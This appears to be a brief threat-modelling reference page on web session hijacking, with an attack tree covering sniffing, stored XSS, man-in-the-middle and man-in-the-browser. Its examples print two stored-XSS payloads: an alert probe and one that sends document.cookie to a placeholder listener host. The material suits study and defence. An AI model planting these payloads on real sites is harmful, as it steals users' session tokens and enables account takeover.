# Hijack session (application)

A web server needs a method to recognize every user’s connections. The most useful method depends on a token that the Web Server sends to the client browser after a successful client authentication. A session token is composed of a string of variable width and can be used in different ways, like in the URL, in the header of the http requisition as a cookie, in other parts of the header of the http request, or in the body of the http requisition.

## Attack tree

```text
1 Get valid token session (Session ID)
    1.1 Use a sniffer (OR)
    1.2 Use an XSS attack to steal the session token
        1.2.1 Stored XSS
            1.2.1 Discover stored XSS vulnerability on target site
            1.2.2 Discover JSESSIONID cookie
            1.2.3 Set up listener
            1.2.4 Send JSESSIONID cookie to listener from target site
    1.3 Use (Man in the Middle) MitM
    1.4 Use (Man in the Browser) MitB
2 Use the valid token session to gain unauthorised access to the web server 
```

## Examples

### Use Stored XSS attack

Discover session cookie (indicator of attack against user, and indicator of compromise of website)

```text
<script>alert(document.cookie)</script>
```

Exploit

```text
<script>new Image().src="<LHost>:<LPort>/hacked.php?output="+ document.cookie;</script>
```